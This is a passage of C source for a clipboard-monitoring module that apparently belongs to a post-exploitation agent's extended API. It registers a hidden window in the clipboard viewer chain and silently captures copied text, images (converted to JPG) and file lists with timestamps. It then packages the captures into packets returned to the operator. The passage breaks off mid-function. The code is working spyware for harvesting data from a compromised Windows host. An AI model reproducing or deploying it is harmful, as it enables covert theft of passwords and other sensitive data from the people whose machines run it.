/*!
 * @file clipboard.c
 * @brief Definitions for clipboard interaction functionality.
 */
#include "extapi.h"
#include "common.h"
#include "common_metapi.h"
#include "clipboard.h"
#include "clipboard_image.h"

/*! @brief The different types of captures that the monitor supports. */
typedef enum _ClipboadrCaptureType
{
	CapText,                           ///! Capture is just plain text.
	CapFiles,                          ///! Capture is a list of one or more files.
	CapImage                           ///! Capture is an image.
} ClipboardCaptureType;

/*! @brief Container for image capture data. */
typedef struct _ClipboardImage
{
	DWORD dwWidth;                     ///! Width of the image.
	DWORD dwHeight;                    ///! Height of the image.
	DWORD dwImageSize;                 ///! Size of the image, in bytes.
	LPBYTE lpImageContent;             ///! Pointer to the image content.
} ClipboardImage;

/*! @brief Container for file capture data. */
typedef struct _ClipboardFile
{
	LPSTR lpPath;                      ///! Full path to the file.
	QWORD qwSize;                      ///! Size of the file in bytes.
	struct _ClipboardFile* pNext;      ///! Pointer to the next file in the copied batch.
} ClipboardFile;

/*! @brief Container for file capture data. */
typedef struct _ClipboardCapture
{
	ClipboardCaptureType captureType; ///! Indicates the type of capture for this entry.
	union
	{
		LPSTR lpText;                  ///! Set when the captureType is CapText.
		ClipboardImage* lpImage;       ///! Set when the captureType is CapImage.
		ClipboardFile* lpFiles;        ///! Set when the captureType is CapFile.
	};
	SYSTEMTIME stCaptureTime;          ///! The time that the clipboard entry was captured.
	DWORD dwSize;                      ///! Size of the clipboard entry.
	struct _ClipboardCapture* pNext;   ///! Pointer to the next captured clipboard entry.
} ClipboardCapture;

/*! @brief Container for the list of clipboard capture entries. */
typedef struct _ClipboardCaptureList
{
	ClipboardCapture* pHead;           ///! Pointer to the head of the capture list.
	ClipboardCapture* pTail;           ///! Pointer to the tail of the capture list.
	LOCK* pClipboardCaptureLock;       ///! Lock to handle concurrent access to the clipboard capture list.
	DWORD dwClipboardDataSize;         ///! Indication of how much data we have in memory.
} ClipboardCaptureList;

/*! @brief Container for clipboard monitor state. */
typedef struct _ClipboardState
{
	char cbWindowClass[256];           ///! Name to use for the window class when registering the message-only window (usually random).
	HWND hClipboardWindow;             ///! Handle to the clipboard monitor window.
	HWND hNextViewer;                  ///! Handle to the next window in the clipboard chain.
	ClipboardCaptureList captureList;  ///! List of clipboard captures.
	BOOL bRunning;                     ///! Indicates if the thread is running or not.
	EVENT* hResponseEvent;             ///! Handle to the event that signals when the thread has actioned the caller's request.
	EVENT* hPauseEvent;                ///! Signalled when the caller wants the thread to pause.
	EVENT* hResumeEvent;               ///! Signalled when the caller wants the thread to resume.
	BOOL bCaptureImageData;            ///! Capture image data that's found on the clipboard.
	THREAD* hThread;                   ///! Reference to the clipboard monitor thread.
} ClipboardState;

/*! @brief Pointer to the state for the monitor thread. */
static ClipboardState* gClipboardState = NULL;
/*! @brief Flag indicating initialision status of the clipboard state. */
static BOOL gClipboardInitialised = FALSE;

/*! @brief GlobalAlloc function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALALLOC)(UINT uFlags, SIZE_T dwBytes);

/*! @brief GlobalFree function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALFREE)(HGLOBAL hMem);

/*! @brief GlobalLock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALLOCK)(HGLOBAL hMem);

/*! @brief GlobalUnlock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALUNLOCK)(HGLOBAL hMem);

/*! @brief OpenClipboard function pointer type. */
typedef BOOL(WINAPI * POPENCLIPBOARD)(HWND hWndNewOwner);

/*! @brief CloseClipboard function pointer type. */
typedef BOOL(WINAPI * PCLOSECLIPBOARD)();

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PSETCLIPBOARDDATA)(UINT uFormat, HANDLE hMem);

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PGETCLIPBOARDDATA)(UINT uFormat);

/*! @brief EnumClipboardFormats function pointer type. */
typedef UINT(WINAPI * PENUMCLIPBOARDFORMATS)(UINT uFormat);

/*! @brief EmptyClipboard function pointer type. */
typedef BOOL(WINAPI * PEMPTYCLIPBOARD)();

/*! @brief DragQueryFileA function pointer type. */
typedef BOOL(WINAPI * PDRAGQUERYFILEA)(HDROP hDrop, UINT iFile, LPSTR lpszFile, UINT cch);

/*! @brief CreateFileA function pointer type. */
typedef HANDLE(WINAPI * PCREATEFILEA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

/*! @brief CloseHandle function pointer type. */
typedef BOOL(WINAPI * PCLOSEHANDLE)(HANDLE hObject);

/*! @brief GetFileSizeEx function pointer type. */
typedef BOOL(WINAPI * PGETFILESIZEEX)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

static PCLOSECLIPBOARD pCloseClipboard = NULL;
static PCLOSEHANDLE pCloseHandle = NULL;
static PCREATEFILEA pCreateFileA = NULL;
static PDRAGQUERYFILEA pDragQueryFileA = NULL;
static PEMPTYCLIPBOARD pEmptyClipboard = NULL;
static PENUMCLIPBOARDFORMATS pEnumClipboardFormats = NULL;
static PGETCLIPBOARDDATA pGetClipboardData = NULL;
static PGETFILESIZEEX pGetFileSizeEx = NULL;
static PGLOBALALLOC pGlobalAlloc = NULL;
static PGLOBALFREE pGlobalFree = NULL;
static PGLOBALLOCK pGlobalLock = NULL;
static PGLOBALUNLOCK pGlobalUnlock = NULL;
static POPENCLIPBOARD pOpenClipboard = NULL;
static PSETCLIPBOARDDATA pSetClipboardData = NULL;

/*!
 * @brief Initialises the clipboard functionality for use.
 * @remark This function has the job of finding all the clipboard related function pointers.
 * @returns An indication of success or failure.
 */
DWORD initialise_clipboard()
{
	DWORD dwResult;
	HMODULE hKernel32 = NULL;
	HMODULE hUser32 = NULL;
	HMODULE hShell32 = NULL;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
		}

		if ((hShell32 = LoadLibraryA("shell32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load shell32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GetClipboardData");
		if ((pGetClipboardData = (PGETCLIPBOARDDATA)GetProcAddress(hUser32, "GetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetClipboardData in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EnumClipboardFormats");
		if ((pEnumClipboardFormats = (PENUMCLIPBOARDFORMATS)GetProcAddress(hUser32, "EnumClipboardFormats")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EnumClipboardFormats in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CreateFileA");
		if ((pCreateFileA = (PCREATEFILEA)GetProcAddress(hKernel32, "CreateFileA")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CreateFileA in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseHandle");
		if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseHandle in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GetFileSizeEx");
		if ((pGetFileSizeEx = (PGETFILESIZEEX)GetProcAddress(hKernel32, "GetFileSizeEx")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetFileSizeEx in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for DragQueryFileA");
		if ((pDragQueryFileA = (PDRAGQUERYFILEA)GetProcAddress(hShell32, "DragQueryFileA")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in shell32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalAlloc");
		if ((pGlobalAlloc = (PGLOBALALLOC)GetProcAddress(hKernel32, "GlobalAlloc")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalAlloc in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EmptyClipboard");
		if ((pEmptyClipboard = (PEMPTYCLIPBOARD)GetProcAddress(hUser32, "EmptyClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EmptyClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for SetClipboardData");
		if ((pSetClipboardData = (PSETCLIPBOARDDATA)GetProcAddress(hUser32, "SetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate SetClipboardData in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalFree");
		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalFree in kernel32.dll");
		}

		dwResult = ERROR_SUCCESS;
		gClipboardInitialised = TRUE;
	} while (0);

	return dwResult;
}

/*!
 * @brief Attempt to open the clipboard. If opening the clipboard fails, it will be retried until max_retry_count is hit, or success occurs.
 * @param hWndNewOwner handle to the window to be associated with the open clipboard. If this parameter is NULL, the open clipboard is associated with the current task.
 * @retval TRUE if the clipboard has been opened
 * @retval FALSE if the clipboard has not been opened
 */
BOOL open_clipboard_with_retries(HWND hWndNewOwner) {
	int max_retry_count = 5;
	for (int i = 0; i < max_retry_count; i++) {
		if (i > 0) {
			dprintf("[EXTAPI CLIPBOARD] Failed to OpenClipboard, sleeping before trying again");
			Sleep(100);
		}

		if (pOpenClipboard(hWndNewOwner)) {
			return TRUE;
		}
	}
	return FALSE;
}

/*!
 * @brief Clean up the list of captures in the given list of captures.
 * @param pCaptureList Pointer to the list of captures to clean up.
 * @param bRemoveLock If \c TRUE, remove the list capture lock.
 * @remark This iterates through the list and correctly frees up all the
 *         resources used by the list.
 */
VOID destroy_clipboard_monitor_capture(ClipboardCaptureList* pCaptureList, BOOL bRemoveLock)
{
	ClipboardFile* pFile, *pNextFile;

	while (pCaptureList->pHead)
	{
		pCaptureList->pTail = pCaptureList->pHead->pNext;

		switch (pCaptureList->pHead->captureType)
		{
		case CapText:
			free(pCaptureList->pHead->lpText);
			break;
		case CapImage:
			free(pCaptureList->pHead->lpImage->lpImageContent);
			free(pCaptureList->pHead->lpImage);
			break;
		case CapFiles:
			pFile = pCaptureList->pHead->lpFiles;

			while (pFile)
			{
				pNextFile = pFile->pNext;
				free(pFile->lpPath);
				free(pFile);
				pFile = pNextFile;
			}
			break;
		}

		free(pCaptureList->pHead);

		pCaptureList->pHead = pCaptureList->pTail;
	}

	if (bRemoveLock && pCaptureList->pClipboardCaptureLock)
	{
		met_api->lock.destroy(pCaptureList->pClipboardCaptureLock);
		pCaptureList->pClipboardCaptureLock = NULL;
	}

	pCaptureList->pHead = pCaptureList->pTail = NULL;
	pCaptureList->dwClipboardDataSize = 0;
}

/*!
 * @brief Convert a timestamp value to a string in the form YYYY-MM-DD HH:mm:ss.ffff
 * @param pTime Pointer to the \c SYSTEMTIME structure to convert.
 * @param buffer Pointer to the buffer that will receive the time value.
 */
VOID timestamp_to_string(SYSTEMTIME* pTime, char buffer[40])
{
	dprintf("[EXTAPI CLIPBOARD] parsing timestamp %p", pTime);
	sprintf_s(buffer, 40, "%04u-%02u-%02u %02u:%02u:%02u.%04u",
		pTime->wYear, pTime->wMonth, pTime->wDay,
		pTime->wHour, pTime->wMinute, pTime->wSecond, pTime->wMilliseconds);
	dprintf("[EXTAPI CLIPBOARD] timestamp parsed");
}

/*!
 * @brief Dump all the captured clipboard data to the given packet.
 * @param pResponse pointer to the response \c Packet that the data needs to be written to.
 * @param pCapture Pointer to the clipboard capture item to dump.
 * @param bCaptureImageData Indication of whether to include image data in the capture.
 */
VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
{
	ClipboardFile* pFile;
	Packet* group = met_api->packet.create_group();
	TlvType groupType;
	Packet* file = NULL;
	char timestamp[40];

	dprintf("[EXTAPI CLIPBOARD] Dumping clipboard capture");

	memset(timestamp, 0, sizeof(timestamp));

	timestamp_to_string(&pCapture->stCaptureTime, timestamp);
	met_api->packet.add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP, timestamp);
	dprintf("[EXTAPI CLIPBOARD] Timestamp added: %s", timestamp);

	switch (pCapture->captureType)
	{
	case CapText:
		dprintf("[EXTAPI CLIPBOARD] Dumping text %s", pCapture->lpText);
		met_api->packet.add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, (PUCHAR)(pCapture->lpText ? pCapture->lpText : "(null - clipboard was cleared)"));
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT;
		break;
	case CapImage:
		dprintf("[EXTAPI CLIPBOARD] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
		met_api->packet.add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX, pCapture->lpImage->dwWidth);
		met_api->packet.add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY, pCapture->lpImage->dwHeight);
		met_api->packet.add_tlv_raw(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA, pCapture->lpImage->lpImageContent, pCapture->lpImage->dwImageSize);
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG;
		break;
	case CapFiles:
		pFile = pCapture->lpFiles;

		while (pFile)
		{
			dprintf("[EXTAPI CLIPBOARD] Dumping file %p", pFile);
			file = met_api->packet.create_group();

			dprintf("[EXTAPI CLIPBOARD] Adding path %s", pFile->lpPath);
			met_api->packet.add_tlv_string(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME, pFile->lpPath);

			dprintf("[EXTAPI CLIPBOARD] Adding size %llu", pFile->qwSize);
			met_api->packet.add_tlv_qword(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE, pFile->qwSize);

			dprintf("[EXTAPI CLIPBOARD] Adding group");
			met_api->packet.add_group(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, file);

			pFile = pFile->pNext;
			dprintf("[EXTAPI CLIPBOARD] Moving to next");
		}
		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILES;
		break;
	}

	met_api->packet.add_group(pResponse, groupType, group);
}

/*!
 * @brief Dump the given clipboard capture list to the specified response.
 * @param pResponse Pointer to the response \c Packet to write the data to.
 * @param pCaptureList Pointer to the list of captures to iterate over and write to the packet.
 * @param bCaptureImageData Indication of whether to include image data in the dump.
 * @param bPurge Indication of whether to purge the contents of the list once dumped.
 * @remark if \c bPurge is \c TRUE the list of capture data is cleared and freed after dumping.
 */
VOID dump_clipboard_capture_list(Packet* pResponse, ClipboardCaptureList* pCaptureList, BOOL bCaptureImageData, BOOL bPurge)
{
	ClipboardCapture* pCapture = NULL;

	met_api->lock.acquire(pCaptureList->pClipboardCaptureLock);
	pCapture = pCaptureList->pHead;
	while (pCapture)
	{
		dump_clipboard_capture(pResponse, pCapture, bCaptureImageData);
		pCapture = pCapture->pNext;
	}

	if (bPurge)
	{
		destroy_clipboard_monitor_capture(pCaptureList, FALSE);
	}
	met_api->lock.release(pCaptureList->pClipboardCaptureLock);
}

/*!
 * @brief Determine if a capture is a duplicate based on the previously captured element.
 * @param pNewCapture Pointer to the new capture value.
 * @param pList Pointer to the capture list of existing captures.
 * @retval TRUE if the contents of \c pNewCapture are the same as the last element in \c pList.
 * @retval FALSE if the contents of \c pNewCapture are not the same as the last element in \c pList.
 * @remark This is quite "dumb" and will only check agains the previous value in the list. The goal
 *         is to reduce fat-fingering copies and reduce the size of the data coming back. If people
 *         copy the same data multiple times at different times then we want to capture that in the
 *         timeline. Comparison is just a byte-for-byte compare.
 */
BOOL is_duplicate(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
{
	ClipboardFile* pTailFiles = NULL;
	ClipboardFile* pNewFiles = NULL;
	BOOL bResult = FALSE;

	met_api->lock.acquire(pList->pClipboardCaptureLock);

	do
	{
		if (pList->pTail == NULL)
		{
			break;
		}

		if (pList->pTail->captureType != pNewCapture->captureType)
		{
			break;
		}

		switch (pNewCapture->captureType)
		{
			case CapText:
			{
				if (lstrcmpA(pNewCapture->lpText, pList->pTail->lpText) == 0)
				{
					bResult = TRUE;
				}
				break;
			}
			case CapFiles:
			{
				pTailFiles = pList->pTail->lpFiles;
				pNewFiles = pNewCapture->lpFiles;

				while (pTailFiles != NULL && pNewFiles != NULL)
				{
					if (pTailFiles->qwSize != pNewFiles->qwSize
						|| lstrcmpA(pTailFiles->lpPath, pNewFiles->lpPath) != 0)
					{
						break;
					}
					pTailFiles = pTailFiles->pNext;
					pNewFiles = pNewFiles->pNext;
				}

				if (pTailFiles == NULL && pNewFiles == NULL)
				{
					// we got to the end without an early-out, and the lists are
					// the same size, so, they're the same!
					bResult = TRUE;
				}

				break;
			}
			case CapImage:
			{
				if (pNewCapture->dwSize == pList->pTail->dwSize
					 && pNewCapture->lpImage->dwHeight == pList->pTail->lpImage->dwHeight
					 && pNewCapture->lpImage->dwWidth == pList->pTail->lpImage->dwWidth)
				{
					// looking quite similar. if no content given we'll assume different because
					// there's little to no damage in recording an extra copy and paste of an image
					// without storing the data. So only when they're both non-null will we continue.
					if (pNewCapture->lpImage->lpImageContent != NULL
						&& pList->pTail->lpImage->lpImageContent != NULL)
					{
						if (memcmp(pNewCapture->lpImage->lpImageContent, pList->pTail->lpImage->lpImageContent, pNewCapture->lpImage->dwImageSize) == 0)
						{
							bResult = TRUE;
						}
					}
				}
				break;
			}
		}
	} while (0);

	met_api->lock.release(pList->pClipboardCaptureLock);

	return bResult;
}

/*!
 * @brief Add a new capture to the list of clipboard captures.
 * @param pNewCapture The newly captured clipboard data to add.
 * @param pList Pointer to the list of captures to add the item to.
 * @returns Indcation of whether the value was added.
 * @retval FALSE Indicates that the value was a duplicate, and not added again.
 */
BOOL add_clipboard_capture(ClipboardCapture* pNewCapture, ClipboardCaptureList* pList)
{
	if (is_duplicate(pNewCapture, pList))
	{
		return FALSE;
	}

	met_api->lock.acquire(pList->pClipboardCaptureLock);

	pNewCapture->pNext = NULL;
	if (pList->pTail == NULL)
	{
		pList->pHead = pList->pTail = pNewCapture;
	}
	else
	{
		pList->pTail->pNext = pNewCapture;
		pList->pTail = pList->pTail->pNext = pNewCapture;
	}
	pList->dwClipboardDataSize += pNewCapture->dwSize;
	met_api->lock.release(pList->pClipboardCaptureLock);
	return TRUE;
}

/*!
 * @brief Capture data that is currently on the clipboard.
 * @param bCaptureImageData Indication of whether to include image data in the capture.
 * @param ppCapture Pointer that will receive a pointer to the newly captured data.
 * @returns Indication of success or failure.
 * @remark If \c ppCapture contains a value when the function returns, the caller needs
 *         to call \c free() on that value later when it finished.
 */
DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
{
	DWORD dwResult;
	DWORD dwCount;
	HANDLE hSourceFile = NULL;
	PCHAR lpClipString = NULL;
	HGLOBAL hClipboardData = NULL;
	HDROP hFileDrop = NULL;
	UINT uFormat = 0;
	UINT uFileIndex = 0;
	UINT uFileCount = 0;
	CHAR lpFileName[MAX_PATH];
	LARGE_INTEGER largeInt = { 0 };
	LPBITMAPINFO lpBI = NULL;
	PUCHAR lpDIB = NULL;
	ConvertedImage image;
	ClipboardFile* pFile = NULL;
	ClipboardCapture* pCapture = (ClipboardCapture*)malloc(sizeof(ClipboardCapture));

	memset(pCapture, 0, sizeof(ClipboardCapture));

	pCapture->pNext = NULL;
	dprintf("[EXTAPI CLIPBOARD] Getting timestamp");
	GetSystemTime(&pCapture->stCaptureTime);
	do
	{
		// Try to get a lock on the clipboard
		if (!open_clipboard_with_retries(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		dprintf("[EXTAPI CLIPBOARD] Clipboard locked, attempting to get data...");

		while (uFormat = pEnumClipboardFormats(uFormat))
		{
			if (uFormat == CF_TEXT)
			{
				// there's raw text on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] Clipboard text captured: %s", lpClipString);
					pCapture->captureType = CapText;
					dwCount = lstrlenA(lpClipString) + 1;
					pCapture->lpText = (char*)malloc(dwCount);
					memset(pCapture->lpText, 0, dwCount);
					strncpy_s(pCapture->lpText, dwCount, lpClipString, dwCount - 1);
					pCapture->dwSize = dwCount;

					pGlobalUnlock(hClipboardData);
				}
			}
			else if (uFormat == CF_DIB)
			{
				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard bitmap data");
				// an image of some kind is on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] CF_DIB grabbed, extracting dimensions.");

					// grab the bitmap image size
					pCapture->captureType = CapImage;
					pCapture->lpImage = (ClipboardImage*)malloc(sizeof(ClipboardImage));
					memset(pCapture->lpImage, 0, sizeof(ClipboardImage));
					pCapture->lpImage->dwWidth = lpBI->bmiHeader.biWidth;
					pCapture->lpImage->dwHeight = lpBI->bmiHeader.biHeight;

					// throw together a basic guess for this, it doesn't have to be exact.
					pCapture->dwSize = lpBI->bmiHeader.biWidth * lpBI->bmiHeader.biHeight * 4;

					// only download the image if they want it
					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
						bCaptureImageData ? "WILL" : "will NOT");

					if (bCaptureImageData)
					{
						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);

						// TODO: add the ability to encode with multiple encoders and return the smallest image.
						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
						{
							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
							pCapture->lpImage->lpImageContent = image.pImageBuffer;
							pCapture->lpImage->dwImageSize = image.dwImageBufferSize;
							pCapture->dwSize = image.dwImageBufferSize;

							// Just leaving this in for debugging purposes later on
							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
							//CloseHandle(hSourceFile);
						}
						else
						{
							dwResult = GetLastError();
							dprintf("[EXTAPI CLIPBOARD] Failed to convert clipboard image to JPG");
						}
					}

					pGlobalUnlock(hClipboardData);
				}
				else
				{
					dwResult = GetLastError();
					dprintf("[EXTAPI CLIPBOARD] Failed to get access to the CF_DIB information");
				}
			}
			else if (uFormat == CF_HDROP)
			{
				// there's one or more files on the clipboard
				dprintf("[EXTAPI CLIPBOARD] Files have been located on the clipboard");
				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard file drop data");
				if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
					&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
				{
					uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);

					dprintf("[EXTAPI CLIPBOARD] Parsing %u file(s) on the clipboard.", uFileCount);
					pCapture->captureType = CapFiles;
					pFile = pCapture->lpFiles;

					for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
					{
						if (pFile == NULL)
						{
							dprintf("[EXTAPI CLIPBOARD] First file");
							pCapture->lpFiles = pFile = (ClipboardFile*)malloc(sizeof(ClipboardFile));
						}
						else
						{
							dprintf("[EXTAPI CLIPBOARD] Extra file");
							pFile->pNext = (ClipboardFile*)malloc(sizeof(ClipboardFile));
							pFile = pFile->pNext;
						}

						memset(pFile, 0, sizeof(ClipboardFile));

						dprintf("[EXTAPI CLIPBOARD] Attempting to get file data");
						if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
						{
							dprintf("[EXTAPI CLIPBOARD] Clipboard file entry: %s", lpFileName);

							dwCount = lstrlenA(lpFileName) + 1;
							pFile->lpPath = (char*)malloc(dwCount);
							memset(pFile->lpPath, 0, dwCount);
							strncpy_s(pFile->lpPath, dwCount, lpFileName, dwCount - 1);
							pCapture->dwSize += dwCount;

							memset(&largeInt, 0, sizeof(largeInt));

							if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
							{
								if (pGetFileSizeEx(hSourceFile, &largeInt))
								{
									pFile->qwSize = largeInt.QuadPart;
								}

								pCloseHandle(hSourceFile);
							}

						}
					}

					pGlobalUnlock(hClipboardData);
				}
			}
		}

		dwResult = GetLastError();
		dprintf("[EXTAPI CLIPBOARD] Finished with result %u (%x)", dwResult, dwResult);

		pCloseClipboard();
	} while (0);

	if (dwResult != ERROR_SUCCESS)
	{
		free(pCapture);
		pCapture = NULL;
	}
	*ppCapture = pCapture;

	return dwResult;
}

/*!
 * @brief Message proc function for the hidden clipboard monitor window.
 * @param hWnd Handle to the window receiving the message.
 * @param uMsg Message that is being received.
 * @param wParam First parameter associated with the message.
 * @param lParam Second parameter associated with the message.
 * @returns Message-specific result.
 * @remark This window proc captures the clipboard change events.
 */
LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	DWORD dwResult;
	ClipboardState* pState = NULL;
	ClipboardCapture* pNewCapture = NULL;

	switch (uMsg)
	{
	case WM_NCCREATE:
		return TRUE;

	case WM_CREATE:
		dprintf("[EXTAPI CLIPBOARD] received WM_CREATE %x (lParam = %p wParam = %p)", hWnd, lParam, wParam);
		pState = (ClipboardState*)((CREATESTRUCTA*)lParam)->lpCreateParams;
		SetWindowLongPtrA(hWnd, GWLP_USERDATA, (LONG_PTR)pState);
		pState->hNextViewer = SetClipboardViewer(hWnd);
		dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer called, next viewer is %x", pState->hNextViewer);

		if (!pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer error %u", GetLastError());
		}

		return 0;

	case WM_CHANGECBCHAIN:
		dprintf("[EXTAPI CLIPBOARD] received WM_CHANGECBCHAIN %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

		if ((HWND)wParam == pState->hNextViewer)
		{
			pState->hNextViewer = (HWND)lParam;
			dprintf("[EXTAPI CLIPBOARD] Next viewer is now %x", pState->hNextViewer);
		}
		else if (pState->hNextViewer)
		{
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}

		return 0;

     case WM_DRAWCLIPBOARD:
		dprintf("[EXTAPI CLIPBOARD] received WM_DRAWCLIPBOARD %x", hWnd);
		pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

		if (pState->bRunning)
		{
			dprintf("[EXTAPI CLIPBOARD] thread is running, harvesting clipboard %x", hWnd);
			dwResult = capture_clipboard(pState->bCaptureImageData, &pNewCapture);
			if (dwResult == ERROR_SUCCESS && pNewCapture != NULL)
			{
				if (add_clipboard_capture(pNewCapture, &pState->captureList))
				{
					dprintf("[EXTAPI CLIPBOARD] Capture added %x", hWnd);
				}
				else
				{
					free(pNewCapture);
					dprintf("[EXTAPI CLIPBOARD] Ignoring duplicate capture", hWnd);
				}
			}
			else
			{
